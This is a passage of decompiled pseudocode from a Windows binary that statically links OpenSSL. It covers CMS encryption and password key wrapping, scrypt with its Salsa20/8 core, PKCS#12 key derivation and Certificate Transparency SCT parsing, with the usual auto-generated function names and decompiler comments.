  v2 = 0;
  v3 = a1[3] != 0;
  v18 = a1[1];
  Src = 0;
  v19 = 0;
  v22 = 0;
  v4 = v3;
  v5 = sub_454120();
  v6 = (_DWORD *)sub_404E70((int)v5);
  Block = v6;
  if ( !v6 )
  {
    sub_408310(46, 120, 65, (int)"crypto\\cms\\cms_enc.c", 41);
    return 0;
  }
  sub_405390(v6, 129, 0, (int)&v17);
  if ( v4 )
  {
    v8 = (int *)a1[3];
    if ( a1[4] )
      a1[3] = 0;
  }
  else
  {
    v9 = sub_423680(*(_DWORD *)v18);
    v10 = sub_4233A0(v9);
    v8 = (int *)sub_430D50((int)v10);
    if ( !v8 )
    {
      sub_408310(46, 120, 148, (int)"crypto\\cms\\cms_enc.c", 58);
      goto LABEL_43;
    }
  }
  if ( sub_406270((int **)v17, v8, 0, 0, 0, v4) > 0 )
  {
    if ( v4 )
    {
      v11 = (unsigned int *)sub_435D30((int)v17);
      v12 = sub_4076A0(v11);
      v13 = sub_423310(v12);
      *(_DWORD *)v18 = v13;
      if ( sub_407410((int)v17) > 0 )
      {
        if ( sub_406FF0() <= 0 )
          goto LABEL_43;
        Src = &v23;
      }
    }
    else if ( sub_407960((int)v17, *(_DWORD **)(v18 + 4)) <= 0 )
    {
      sub_408310(46, 120, 102, (int)"crypto\\cms\\cms_enc.c", 81);
      goto LABEL_43;
    }
    v14 = sub_407470((int)v17);
    v2 = v14;
    if ( !v4 || !a1[4] )
    {
      v1 = sub_4133F0(v14);
      if ( !v1 )
      {
        sub_408310(46, 120, 65, (int)"crypto\\cms\\cms_enc.c", 89);
        goto LABEL_43;
      }
      if ( sub_406120((int)v17, (int)v1) <= 0 )
        goto LABEL_43;
    }
    if ( !a1[4] )
    {
      a1[4] = v1;
      v1 = 0;
      a1[5] = v2;
      if ( v4 )
        v22 = 1;
      else
        sub_408400();
    }
    if ( a1[5] != v2 && sub_406600(v17, a1[5]) <= 0 )
    {
      if ( v4 || a1[6] )
      {
        sub_408310(46, 120, 118, (int)"crypto\\cms\\cms_enc.c", 116);
        goto LABEL_41;
      }
      sub_4134B0((_BYTE *)a1[4], a1[5]);
      a1[4] = v1;
      a1[5] = v2;
      v1 = 0;
      sub_408400();
    }
    if ( sub_406270((int **)v17, 0, 0, a1[4], Src, v4) > 0 )
    {
      if ( v4 )
      {
        v15 = (_DWORD *)sub_42C600();
        v16 = v18;
        *(_DWORD *)(v18 + 4) = v15;
        if ( !v15 )
        {
          sub_408310(46, 120, 65, (int)"crypto\\cms\\cms_enc.c", 137);
          goto LABEL_41;
        }
        if ( sub_4078F0((int)v17, v15) <= 0 )
        {
          sub_408310(46, 120, 102, (int)"crypto\\cms\\cms_enc.c", 142);
          goto LABEL_41;
        }
        if ( **(_DWORD **)(v16 + 4) == -1 )
        {
          sub_42C610(*(_DWORD *)(v16 + 4));
          *(_DWORD *)(v16 + 4) = 0;
        }
      }
      v19 = 1;
      goto LABEL_41;
    }
    sub_408310(46, 120, 101, (int)"crypto\\cms\\cms_enc.c", 131);
LABEL_41:
    if ( v22 && v19 )
      goto LABEL_44;
    goto LABEL_43;
  }
  sub_408310(46, 120, 101, (int)"crypto\\cms\\cms_enc.c", 65);
LABEL_43:
  sub_4134B0((_BYTE *)a1[4], a1[5]);
  a1[4] = 0;
LABEL_44:
  sub_4134B0(v1, v2);
  if ( v19 )
    return Block;
  sub_404F50((volatile LONG *)Block);
  return 0;
}

//----- (004CE6F0) --------------------------------------------------------
void *__cdecl sub_4CE6F0(int a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD **)(a1 + 4);
  v2 = (_DWORD *)v1[1];
  if ( v2[3] && v1[2] )
    *v1 = 2;
  return sub_4CE340(v2);
}

//----- (004CE720) --------------------------------------------------------
size_t __cdecl sub_4CE720(int a1, int *a2, _DWORD *a3, void *Src, size_t Size)
{
  return sub_414080(a1, a2, a3, Src, Size, (void (__cdecl *)(int *, int *, int))sub_40F780);
}

//----- (004CE750) --------------------------------------------------------
char *__usercall sub_4CE750@<eax>(unsigned int a1@<edi>, void *a2, _DWORD *a3, char *Src, int **a5)
{
  unsigned int v5; // ebp
  char *result; // eax
  char *v7; // esi
  int v8; // eax
  int v9; // ebx
  size_t v10; // [esp-8h] [ebp-18h]
  int v11; // [esp+8h] [ebp-8h] BYREF
  int v12; // [esp+Ch] [ebp-4h]

  v5 = sub_4073D0((int)a5);
  v12 = 0;
  if ( a1 < 2 * v5 || a1 % v5 )
    return 0;
  result = (char *)sub_4133F0(a1);
  v7 = result;
  if ( result )
  {
    if ( sub_405D40(a5, &result[a1 + -2 * v5], &v11, &Src[a1 + -2 * v5], 2 * v5)
      && sub_405D40(a5, v7, &v11, &v7[a1 - v5], v5)
      && sub_405D40(a5, v7, &v11, Src, a1 - v5)
      && sub_4065D0(a5, 0, 0, 0, 0)
      && sub_405D40(a5, v7, &v11, v7, a1)
      && ((unsigned __int8)(v7[4] ^ v7[1]) & (unsigned __int8)((v7[2] ^ v7[5]) & (v7[3] ^ v7[6]))) == 0xFF
      && (v8 = (unsigned __int8)*v7, a1 >= v8 - 4) )
    {
      v10 = (unsigned __int8)*v7;
      *a3 = v8;
      memcpy(a2, v7 + 4, v10);
      v9 = 1;
    }
    else
    {
      v9 = v12;
    }
    sub_4134B0(v7, a1);
    return (char *)v9;
  }
  return result;
}

//----- (004CE8B0) --------------------------------------------------------
int __usercall sub_4CE8B0@<eax>(size_t a1@<ecx>, char *a2@<edi>, unsigned int *a3, _BYTE *Src, _DWORD *a5)
{
  unsigned int v6; // eax
  unsigned int v7; // esi
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v6 = sub_4073D0((int)a5);
  v7 = v6 * ((v6 + a1 + 3) / v6);
  if ( v7 < 2 * v6 || a1 > 0xFF )
    return 0;
  if ( a2 )
  {
    *a2 = a1;
    a2[1] = ~*Src;
    a2[2] = ~Src[1];
    a2[3] = ~Src[2];
    memcpy(a2 + 4, Src, a1);
    if ( v7 > a1 + 4 && sub_406FF0() <= 0 )
      return 0;
    if ( !sub_405A00(a5, a2, &v9, a2, v7) || !sub_405A00(a5, a2, &v9, a2, v7) )
      return 0;
  }
  *a3 = v7;
  return 1;
}

//----- (004CE990) --------------------------------------------------------
int __cdecl sub_4CE990(unsigned int a1, int a2, int a3)
{
  int v3; // ebx
  char *v4; // ebp
  int *v6; // esi
  int *v7; // eax
  int *v8; // eax
  int v9; // eax
  char *v10; // eax
  int *v11; // edi
  int **v12; // eax
  int **v13; // esi
  int v14; // edi
  unsigned int v15; // edi
  unsigned int v16; // ecx
  size_t v17; // eax
  unsigned int v18; // ecx
  char *v19; // eax
  unsigned int v20; // ecx
  int *v21; // [esp-8h] [ebp-18h]
  int v22; // [esp+8h] [ebp-8h]
  int v23; // [esp+Ch] [ebp-4h]

  v3 = *(_DWORD *)(a2 + 4);
  v4 = 0;
  v23 = 0;
  v22 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
  if ( !*(_DWORD *)(v3 + 16) )
  {
    sub_408310(46, 167, 178, (int)"crypto\\cms\\cms_pwri.c", 292);
    return 0;
  }
  v6 = *(int **)(v3 + 8);
  if ( !v6 || sub_423680(*v6) != 893 )
  {
    sub_408310(46, 167, 179, (int)"crypto\\cms\\cms_pwri.c", 299);
    return 0;
  }
  v21 = (int *)v6[1];
  v7 = (int *)sub_42C6D0();
  v8 = (int *)sub_423FE0(v7, v21);
  a2 = (int)v8;
  if ( !v8 )
  {
    sub_408310(46, 167, 176, (int)"crypto\\cms\\cms_pwri.c", 308);
    return 0;
  }
  v9 = sub_423680(*v8);
  v10 = sub_4233A0(v9);
  v11 = (int *)sub_430D50((int)v10);
  if ( !v11 )
  {
    sub_408310(46, 167, 148, (int)"crypto\\cms\\cms_pwri.c", 315);
    return 0;
  }
  v12 = (int **)sub_405990();
  v13 = v12;
  if ( !v12 )
  {
    sub_408310(46, 167, 65, (int)"crypto\\cms\\cms_pwri.c", 321);
    return 0;
  }
  if ( sub_406270(v12, v11, 0, 0, 0, a3) )
  {
    sub_406060((int)v13, 0);
    if ( sub_407960((int)v13, *(_DWORD **)(a2 + 4)) < 0 )
    {
      sub_408310(46, 167, 102, (int)"crypto\\cms\\cms_pwri.c", 330);
      goto LABEL_29;
    }
    v14 = a3;
    if ( sub_44BCE0(
           **(_DWORD **)(v3 + 4),
           *(const char **)(v3 + 16),
           *(_DWORD *)(v3 + 20),
           *(_DWORD *)(*(_DWORD *)(v3 + 4) + 4),
           (int)v13,
           a3) < 0 )
    {
      sub_408310(46, 167, 6, (int)"crypto\\cms\\cms_pwri.c", 341);
      goto LABEL_29;
    }
    if ( !v14 )
    {
      v19 = (char *)sub_4133F0(**(_DWORD **)(v3 + 12));
      v4 = v19;
      if ( !v19 )
      {
        sub_408310(46, 167, 65, (int)"crypto\\cms\\cms_pwri.c", 365);
        goto LABEL_29;
      }
      if ( !sub_4CE750(**(_DWORD **)(v3 + 12), v19, &a1, *(char **)(*(_DWORD *)(v3 + 12) + 8), v13) )
      {
        sub_408310(46, 167, 180, (int)"crypto\\cms\\cms_pwri.c", 371);
        goto LABEL_29;
      }
      v20 = a1;
      *(_DWORD *)(v22 + 16) = v4;
      *(_DWORD *)(v22 + 20) = v20;
LABEL_28:
      v23 = 1;
      goto LABEL_29;
    }
    v15 = *(_DWORD *)(v22 + 20);
    v16 = sub_4073D0((int)v13);
    v17 = v16 * ((v16 + v15 + 3) / v16);
    if ( v17 >= 2 * v16 && v15 <= 0xFF )
    {
      a1 = v16 * ((v16 + v15 + 3) / v16);
      v4 = (char *)sub_4133F0(v17);
      if ( v4 )
      {
        if ( sub_4CE8B0(*(_DWORD *)(v22 + 20), v4, &a1, *(_BYTE **)(v22 + 16), v13) )
        {
          v18 = a1;
          *(_DWORD *)(*(_DWORD *)(v3 + 12) + 8) = v4;
          **(_DWORD **)(v3 + 12) = v18;
          goto LABEL_28;
        }
      }
    }
  }
LABEL_29:
  sub_4059B0(v13);
  if ( !v23 )
    sub_413490(v4);
  sub_42C730(a2);
  return v23;
}

//----- (004CECC0) --------------------------------------------------------
int __cdecl sub_4CECC0(int a1, _DWORD *a2, int a3, int a4, int *a5)
{
  int result; // eax
  int v6; // esi
  void *Block; // [esp+0h] [ebp-4h] BYREF

  result = sub_437210(a1, a2, a3, &Block, a5);
  if ( result )
  {
    v6 = sub_4174D0(Block, result, a4);
    sub_413490(Block);
    return v6;
  }
  return result;
}

//----- (004CED20) --------------------------------------------------------
int __cdecl sub_4CED20(_DWORD *a1, int *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  _DWORD *v4; // eax

  v2 = (_DWORD *)sub_4CDE80(a2);
  v3 = v2;
  if ( v2 )
  {
    if ( *v2 || (v4 = sub_42C430(), (*v3 = v4) != 0) )
    {
      *(_DWORD *)(*v3 + 12) |= 0x10u;
      *(_DWORD *)(*v3 + 12) &= ~0x20u;
      *a1 = *v3 + 8;
      return 1;
    }
    sub_408310(46, 155, 65, (int)"crypto\\cms\\cms_io.c", 31);
  }
  return 0;
}

//----- (004CED80) --------------------------------------------------------
int __cdecl sub_4CED80(int a1)
{
  return sub_4548F0(*(_DWORD *)(a1 + 12));
}

//----- (004CED90) --------------------------------------------------------
int __cdecl sub_4CED90(int a1, unsigned int a2, int a3)
{
  return sub_431A00(*(int **)(a1 + 12), a2, a3);
}

//----- (004CEDA0) --------------------------------------------------------
BOOL __cdecl sub_4CEDA0(int a1, int a2, int a3, char *Src, signed int Size)
{
  return sub_454C90((void ***)(a1 + 12), a2, a3, Src, Size) != 0;
}

//----- (004CEDD0) --------------------------------------------------------
int __cdecl sub_4CEDD0(_DWORD *a1)
{
  int v1; // edx
  int v2; // edi
  int v3; // ecx
  int v4; // eax
  int v5; // esi
  int v6; // eax
  int v7; // ecx
  int v8; // edx
  int v9; // esi
  int v10; // edi
  int v11; // ebx
  int v12; // ebx
  int v13; // ebx
  int v14; // ecx
  _DWORD *v15; // eax
  int v17; // [esp+10h] [ebp-44h]
  int v18[16]; // [esp+14h] [ebp-40h] BYREF

  qmemcpy(v18, a1, sizeof(v18));
  v1 = v18[12];
  v2 = v18[9];
  v3 = v18[8];
  v4 = v18[4];
  v5 = v18[0];
  v17 = 4;
  do
  {
    v6 = __ROL4__(v1 + v5, 7) ^ v4;
    v7 = __ROL4__(v6 + v5, 9) ^ v3;
    v8 = __ROL4__(v7 + v6, 13) ^ v1;
    v9 = __ROR4__(v7 + v8, 14) ^ v5;
    v10 = __ROL4__(v18[5] + v18[1], 7) ^ v2;
    v18[13] ^= __ROL4__(v10 + v18[5], 9);
    v11 = __ROL4__(v18[13] + v10, 13) ^ v18[1];
    v18[5] ^= __ROR4__(v11 + v18[13], 14);
    v18[1] = v11;
    v18[14] ^= __ROL4__(v18[6] + v18[10], 7);
    v18[2] ^= __ROL4__(v18[14] + v18[10], 9);
    v12 = __ROL4__(v18[2] + v18[14], 13) ^ v18[6];
    v18[10] ^= __ROR4__(v12 + v18[2], 14);
    v18[6] = v12;
    v18[3] ^= __ROL4__(v18[11] + v18[15], 7);
    v18[7] ^= __ROL4__(v18[3] + v18[15], 9);
    v13 = __ROL4__(v18[7] + v18[3], 13) ^ v18[11];
    v18[15] ^= __ROR4__(v13 + v18[7], 14);
    v18[1] ^= __ROL4__(v18[3] + v9, 7);
    v18[2] ^= __ROL4__(v18[1] + v9, 9);
    v18[3] ^= __ROL4__(v18[2] + v18[1], 13);
    v5 = __ROR4__(v18[2] + v18[3], 14) ^ v9;
    v18[6] ^= __ROL4__(v18[5] + v6, 7);
    v18[7] ^= __ROL4__(v18[6] + v18[5], 9);
    v4 = __ROL4__(v18[6] + v18[7], 13) ^ v6;
    v18[5] ^= __ROR4__(v4 + v18[7], 14);
    v18[11] = __ROL4__(v10 + v18[10], 7) ^ v13;
    v3 = __ROL4__(v18[10] + v18[11], 9) ^ v7;
    v2 = __ROL4__(v3 + v18[11], 13) ^ v10;
    v18[10] ^= __ROR4__(v2 + v3, 14);
    v1 = __ROL4__(v18[14] + v18[15], 7) ^ v8;
    v18[13] ^= __ROL4__(v18[15] + v1, 9);
    v18[14] ^= __ROL4__(v18[13] + v1, 13);
    v18[15] ^= __ROR4__(v18[13] + v18[14], 14);
    --v17;
  }
  while ( v17 );
  v18[12] = v1;
  v18[9] = v2;
  v18[0] = v5;
  v18[8] = v3;
  v18[4] = v4;
  v14 = 0;
  v15 = a1 + 2;
  do
  {
    *(v15 - 2) += v18[v14];
    *(v15 - 1) += v18[v14 + 1];
    *v15 += *(_DWORD *)((char *)v15 + (char *)v18 - (char *)a1);
    v15[1] += *(_DWORD *)((char *)v15 + (char *)&v18[1] - (char *)a1);
    v14 += 4;
    v15 += 4;
  }
  while ( v14 < 16 );
  return sub_4139E0(v18, 0x40u);
}

//----- (004CF070) --------------------------------------------------------
int __cdecl sub_4CF070(int a1, __int64 a2)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // ebx
  unsigned int v4; // ebp
  unsigned int v5; // eax
  unsigned int v6; // ecx
  int *v7; // edi
  unsigned int v8; // eax
  unsigned int v10; // [esp+14h] [ebp-4Ch]
  int v11[16]; // [esp+20h] [ebp-40h] BYREF

  v3 = v2;
  v4 = 0;
  qmemcpy(v11, &v2[32 * (_DWORD)a2 - 16], sizeof(v11));
  v10 = 0;
  if ( !is_mul_ok(2u, a2) || 2 * (_DWORD)a2 )
  {
    do
    {
      v5 = 0;
      v6 = 0;
      do
      {
        v11[v5] ^= *v3++;
        v6 = (__PAIR64__(v6, v5++) + 1) >> 32;
      }
      while ( __PAIR64__(v6, v5) < 0x10 );
      sub_4CEDD0(v11);
      v7 = (int *)(a1 + (((unsigned int)(__PAIR64__(v10, v4) >> 1) + (_DWORD)a2 * (v4 & 1)) << 6));
      v8 = (__PAIR64__(v10, v4++) + 1) >> 32;
      qmemcpy(v7, v11, 0x40u);
      v10 = v8;
    }
    while ( __PAIR64__(v8, v4) < 2 * a2 );
  }
  return sub_4139E0(v11, 0x40u);
}
// 4CF086: variable 'v2' is possibly undefined
// 4CF070: using guessed type int var_40[16];

//----- (004CF150) --------------------------------------------------------
unsigned __int8 *__cdecl sub_4CF150(unsigned __int8 *a1, __int64 a2, unsigned __int64 a3, int a4, int a5, _DWORD *a6)
{
  _DWORD *v6; // esi
  unsigned __int8 *v7; // edi
  unsigned int v8; // ebp
  int v9; // edx
  unsigned __int8 *v10; // edi
  int v11; // edx
  unsigned int v12; // edi
  unsigned int v13; // ebp
  _DWORD *v14; // eax
  unsigned int v15; // ecx
  unsigned int v16; // edx
  int v17; // edi
  unsigned __int8 *result; // eax
  unsigned int v19; // esi
  unsigned int v20; // edi
  int v21; // ecx
  _BYTE *v22; // eax
  unsigned int v23; // [esp+14h] [ebp-10h]
  int v24; // [esp+14h] [ebp-10h]
  unsigned __int64 v25; // [esp+14h] [ebp-10h]
  unsigned __int64 v26; // [esp+1Ch] [ebp-8h]

  v6 = a6;
  v7 = a1;
  v8 = 0;
  v23 = 0;
  v26 = 32 * a2;
  if ( !is_mul_ok(0x20u, a2) || 32 * (_DWORD)a2 )
  {
    do
    {
      *v6 = *v7;
      v9 = v7[1];
      v10 = v7 + 1;
      *v6 |= v9 << 8;
      v11 = *++v10;
      *v6 |= v11 << 16;
      *v6 |= v10[1] << 24;
      v7 = v10 + 2;
      v8 = (__PAIR64__(v8, v23++) + 1) >> 32;
      ++v6;
    }
    while ( __PAIR64__(v8, v23) < 32 * a2 );
  }
  v12 = HIDWORD(a3);
  v13 = 0;
  v24 = 1;
  if ( a3 > 1 )
  {
    do
    {
      sub_4CF070((int)v6, a2);
      v13 = (__PAIR64__(v13, v24++) + 1) >> 32;
      v6 += 32 * a2;
    }
    while ( __PAIR64__(v13, v24) < a3 );
  }
  sub_4CF070(a4, a2);
  v25 = 0i64;
  if ( a3 )
  {
    do
    {
      v14 = &a6[32 * (_DWORD)a2 * (*(unsigned int *)(((_DWORD)a2 << 7) + a4 - 64) % __PAIR64__(v12, a3))];
      v15 = 0;
      v16 = 0;
      if ( v26 )
      {
        do
        {
          v17 = *v14++ ^ *(_DWORD *)(a4 + 4 * v15);
          *(_DWORD *)(a5 + 4 * v15) = v17;
          v16 = (__PAIR64__(v16, v15++) + 1) >> 32;
        }
        while ( __PAIR64__(v16, v15) < v26 );
        v12 = HIDWORD(a3);
      }
      sub_4CF070(a4, a2);
      ++v25;
    }
    while ( v25 < __PAIR64__(v12, a3) );
  }
  result = a1;
  v19 = 0;
  v20 = 0;
  if ( v26 )
  {
    do
    {
      v21 = *(_DWORD *)(a4 + 4 * v19);
      *result = v21;
      v22 = result + 1;
      *v22++ = BYTE1(v21);
      *v22++ = BYTE2(v21);
      *v22 = HIBYTE(v21);
      result = v22 + 1;
      v20 = (__PAIR64__(v20, v19++) + 1) >> 32;
    }
    while ( __PAIR64__(v20, v19) < v26 );
  }
  return result;
}

//----- (004CF370) --------------------------------------------------------
int __cdecl sub_4CF370(
        char *a1,
        int a2,
        int a3,
        int a4,
        unsigned __int64 a5,
        unsigned __int64 a6,
        unsigned __int64 a7,
        __int64 a8,
        char *a9,
        int a10)
{
  __int64 v10; // rax
  int v11; // ebp
  unsigned int v13; // ecx
  size_t v14; // edi
  int v15; // eax
  char *v16; // eax
  char *v17; // ebx
  int *v18; // eax
  unsigned int v19; // ebp
  unsigned int v20; // edi
  int *v21; // eax
  size_t v22; // [esp+10h] [ebp-18h]
  int v23; // [esp+14h] [ebp-14h]
  int v24; // [esp+1Ch] [ebp-Ch]
  unsigned __int64 v25; // [esp+20h] [ebp-8h]

  v23 = 0;
  if ( !a6
    || !a7
    || a5 < 2
    || HIDWORD(a5) & (((_DWORD)a5 != 0) + HIDWORD(a5) - 1) | (unsigned int)a5 & ((_DWORD)a5 - 1)
    || a7 > 0x3FFFFFFF / a6
    || is_mul_ok(0x10u, a6) && (unsigned int)(16 * a6) <= 0x3F && a5 >= 1i64 << (16 * (unsigned __int8)a6) )
  {
    return 0;
  }
  v25 = (a6 * a7) << 7;
  if ( a5 + 2 > 0x1FFFFFFFFFFFFFFi64 / a6 )
    return 0;
  v10 = ((a5 + 2) * a6) << 7;
  if ( HIDWORD(v25) < (unsigned __int64)(-1 - v10) >> 32 )
  {
    v11 = ((_DWORD)a6 * (_DWORD)a7) << 7;
  }
  else
  {
    if ( HIDWORD(v25) > (unsigned __int64)(-1 - v10) >> 32 )
      return 0;
    v11 = ((_DWORD)a6 * (_DWORD)a7) << 7;
    if ( (unsigned int)v25 > -1 - (int)v10 )
      return 0;
  }
  if ( __PAIR64__(HIDWORD(v25), v11) > 0xFFFFFFFFi64 - v10 )
    return 0;
  v13 = a8;
  v14 = v10 + v11;
  v15 = HIDWORD(a8);
  v22 = v14;
  if ( !a8 )
  {
    v13 = 0x2000000;
    v15 = 0;
  }
  if ( !v15 && v14 > v13 )
  {
    sub_408310(6, 181, 172, (int)"crypto\\evp\\scrypt.c", 219);
    return 0;
  }
  if ( !a9 )
    return 1;
  v16 = (char *)sub_4133F0(v14);
  v17 = v16;
  if ( !v16 )
    return 0;
  v24 = (int)&v16[128 * (_DWORD)a6 + v11];
  v18 = (int *)sub_42BF50();
  if ( sub_47A650(a1, a2, a3, a4, 1, v18, v11, v17) )
  {
    v19 = 0;
    v20 = 0;
    do
    {
      sub_4CF150(
        (unsigned __int8 *)&v17[128 * (_DWORD)a6 * v20],
        a6,
        a5,
        (int)&v17[v25],
        v24,
        (_DWORD *)(v24 + ((_DWORD)a6 << 7)));
      v19 = (__PAIR64__(v19, v20++) + 1) >> 32;
    }
    while ( __PAIR64__(v19, v20) < a7 );
    v21 = (int *)sub_42BF50();
    v14 = v22;
    if ( sub_47A650(a1, a2, (int)v17, v25, 1, v21, a10, a9) )
      v23 = 1;
  }
  sub_4134B0(v17, v14);
  return v23;
}
// 4CF58F: conditional instruction was optimized away because %arg_20.8!=0

//----- (004CF650) --------------------------------------------------------
int __cdecl sub_4CF650(int a1, int a2, int a3, int a4, int Val, int a6, signed int Size, char *a8, int *a9)
{
  int v9; // esi
  int v10; // ebp
  void *v11; // ebx
  int v12; // edi
  int v13; // eax
  int *v14; // eax
  char *v15; // ecx
  int i; // ebx
  int v17; // edx
  int j; // edi
  int v19; // edx
  int v21; // ebx
  size_t v22; // eax
  int v23; // ecx
  int v24; // edx
  int v25; // ebp
  char *v26; // ebx
  int v27; // kr00_4
  int v28; // edi
  int v29; // eax
  void **v30; // [esp+10h] [ebp-2Ch]
  char *Block; // [esp+14h] [ebp-28h]
  void *Src; // [esp+18h] [ebp-24h]
  char *v33; // [esp+1Ch] [ebp-20h]
  int *v34; // [esp+20h] [ebp-1Ch]
  _BYTE **v35; // [esp+24h] [ebp-18h]
  int v36; // [esp+28h] [ebp-14h]
  void *v37; // [esp+2Ch] [ebp-10h]
  int v38; // [esp+30h] [ebp-Ch]
  int v39; // [esp+34h] [ebp-8h]
  int v40; // [esp+38h] [ebp-4h]

  Block = 0;
  v37 = 0;
  v33 = 0;
  Src = 0;
  v39 = 0;
  v30 = 0;
  v34 = 0;
  v35 = (_BYTE **)sub_42B820();
  if ( v35 )
  {
    v9 = sub_44CEB0((int)a9);
    v10 = sub_407480((int)a9);
    v40 = v10;
    if ( v10 >= 0 && v9 > 0 )
    {
      v11 = sub_4133F0(v9);
      v37 = v11;
      Src = sub_4133F0(v10);
      Block = (char *)sub_4133F0(v9 + 1);
      v12 = v9 * ((v9 + a4 - 1) / v9);
      if ( a2 )
      {
        v13 = v9 * ((v9 + a2 - 1) / v9);
        v36 = v13;
      }
      else
      {
        v36 = 0;
        v13 = 0;
      }
      v38 = v12 + v13;
      v33 = (char *)sub_4133F0(v12 + v13);
      v30 = (void **)sub_4168C0();
      v14 = sub_4168C0();
      v34 = v14;
      if ( v11 )
      {
        if ( Src && Block && v33 && v30 && v14 )
        {
          memset(v11, Val, v9);
          v15 = v33;
          for ( i = 0; i < v12; *(v15 - 1) = *(_BYTE *)(v17 + a3) )
          {
            v17 = i % a4;
            ++i;
            ++v15;
          }
          for ( j = 0; j < v36; *(v15 - 1) = *(_BYTE *)(v19 + a1) )
          {
            v19 = j % a2;
            ++j;
            ++v15;
          }
          if ( sub_42B860((int)v35, a9, 0) )
          {
            while ( sub_42BA10((int)v35) && sub_42BA10((int)v35) && sub_42BA20(v35, (int)Src, 0) )
            {
              v21 = 1;
              if ( a6 > 1 )
              {
                while ( sub_42B860((int)v35, a9, 0) && sub_42BA10((int)v35) && sub_42BA20(v35, (int)Src, 0) )
                {
                  if ( ++v21 >= a6 )
                    goto LABEL_29;
                }
                break;
              }
LABEL_29:
              v22 = Size;
              if ( Size >= v10 )
                v22 = v10;
              memcpy(a8, Src, v22);
              if ( v10 >= Size )
              {
                v39 = 1;
                goto LABEL_19;
              }
              a8 += v10;
              v23 = 0;
              Size -= v10;
              do
              {
                v24 = v23 % v10;
                Block[v23++] = *((_BYTE *)Src + v24);
              }
              while ( v23 < v9 );
              if ( !sub_4174D0(Block, v9, (int)v34) || !sub_437FD0(v34, 1) )
                break;
              v25 = 0;
              if ( v38 > 0 )
              {
                v26 = v33;
                while ( sub_4174D0(v26, v9, (int)v30) && sub_4220E0(v30, (int)v30, (int)v34) && sub_417300(v30, Block) )
                {
                  v27 = sub_416F90(v30) + 7;
                  v28 = v27 / 8;
                  if ( v27 / 8 <= v9 )
                  {
                    if ( v27 / 8 >= v9 )
                    {
                      v29 = sub_417300(v30, v26);
                    }
                    else
                    {
                      memset(v26, 0, v9 - v28);
                      v29 = sub_417300(v30, &v33[v9 + v25 - v28]);
                    }
                    if ( !v29 )
                      goto LABEL_18;
                  }
                  else
                  {
                    if ( !sub_417300(v30, Block) )
                      goto LABEL_18;
                    memcpy(v26, Block + 1, v9);
                  }
                  v25 += v9;
                  v26 += v9;
                  if ( v25 >= v38 )
                    goto LABEL_49;
                }
                break;
              }
LABEL_49:
              if ( !sub_42B860((int)v35, a9, 0) )
                break;
              v10 = v40;
            }
          }
        }
      }
    }
  }
LABEL_18:
  sub_408310(35, 111, 65, (int)"crypto\\pkcs12\\p12_key.c", 185);
LABEL_19:
  sub_413490(Src);
  sub_413490(Block);
  sub_413490(v37);
  sub_413490(v33);
  sub_417060(v30);
  sub_417060((void **)v34);
  sub_42B840(v35);
  return v39;
}
// 4CF789: conditional instruction was optimized away because esi.4>=1
// 4CF978: conditional instruction was optimized away because esi.4>=1

//----- (004CFAF0) --------------------------------------------------------
int __cdecl sub_4CFAF0(const char *a1, int a2, int a3, int a4, int Val, int a6, signed int Size, char *a8, int *a9)
{
  int v9; // esi
  void *Block; // [esp+0h] [ebp-4h] BYREF

  if ( a1 )
  {
    if ( !sub_4D63E0(a1, a2, &Block, (size_t *)&a1) )
    {
      sub_408310(35, 116, 65, (int)"crypto\\pkcs12\\p12_key.c", 65);
      return 0;
    }
  }
  else
  {
    Block = 0;
    a1 = 0;
  }
  v9 = sub_4CF650((int)Block, (int)a1, a3, a4, Val, a6, Size, a8, a9);
  if ( v9 <= 0 )
    return 0;
  sub_4134B0(Block, (int)a1);
  return v9;
}

//----- (004CFBA0) --------------------------------------------------------
int __cdecl sub_4CFBA0(int a1, _BYTE **a2, unsigned int a3)
{
  _BYTE *v4; // esi
  unsigned __int8 *v5; // esi
  int v6; // edx
  int v7; // edi
  _BYTE *v8; // esi
  unsigned int v9; // ebx
  unsigned int v10; // edi

  if ( *(_DWORD *)a1 )
  {
    sub_408310(50, 112, 103, (int)"crypto\\ct\\ct_oct.c", 31);
    return -1;
  }
  if ( a3 <= 4 )
  {
    sub_408310(50, 112, 107, (int)"crypto\\ct\\ct_oct.c", 42);
    return -1;
  }
  v4 = *a2 + 1;
  *(_BYTE *)(a1 + 40) = **a2;
  *(_BYTE *)(a1 + 41) = *v4;
  v5 = v4 + 1;
  if ( !sub_4D6690(a1) )
  {
    sub_408310(50, 112, 107, (int)"crypto\\ct\\ct_oct.c", 51);
    return -1;
  }
  v6 = v5[1];
  v7 = *v5;
  v8 = v5 + 2;
  v9 = a3 + *a2 - v8;
  v10 = v6 | (v7 << 8);
  if ( v10 > v9 )
  {
    sub_408310(50, 112, 107, (int)"crypto\\ct\\ct_oct.c", 58);
    return -1;
  }
  if ( sub_4D6600(a1, v8, v10) != 1 )
    return -1;
  *a2 = &v8[v10];
  return a3 + v10 - v9;
}

//----- (004CFC90) --------------------------------------------------------
void **__cdecl sub_4CFC90(void ***a1, void **a2, size_t Size)
{
  size_t v3; // ebp
  void **v4; // esi
  unsigned __int8 *v5; // edi
  void *v6; // eax
  unsigned __int8 *v7; // edi
  unsigned int v8; // ebp
  void *v9; // eax
  unsigned __int8 *v10; // edi
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  unsigned int v17; // eax
  unsigned int v18; // ebx
  void *v19; // edi
  void *v20; // eax
  unsigned int v21; // ebp
  int v22; // eax
  void *v23; // eax

  v3 = Size;
  v4 = 0;
  if ( !Size || Size > 0xFFFF )
  {
    sub_408310(50, 110, 104, (int)"crypto\\ct\\ct_oct.c", 76);
    goto LABEL_21;
  }
  v4 = (void **)sub_4D6560();
  if ( !v4 )
  {
LABEL_21:
    sub_4D65A0(v4);
    return 0;
  }
  v5 = (unsigned __int8 *)*a2;
  v6 = (void *)*(unsigned __int8 *)*a2;
  *v4 = v6;
  if ( v6 )
  {
    v23 = sub_424800(v5, v3);
    v4[1] = v23;
    if ( !v23 )
      goto LABEL_21;
    v4[2] = (void *)v3;
    *a2 = &v5[v3];
  }
  else
  {
    if ( v3 < 0x2B )
    {
      sub_408310(50, 110, 104, (int)"crypto\\ct\\ct_oct.c", 99);
      goto LABEL_21;
    }
    v7 = v5 + 1;
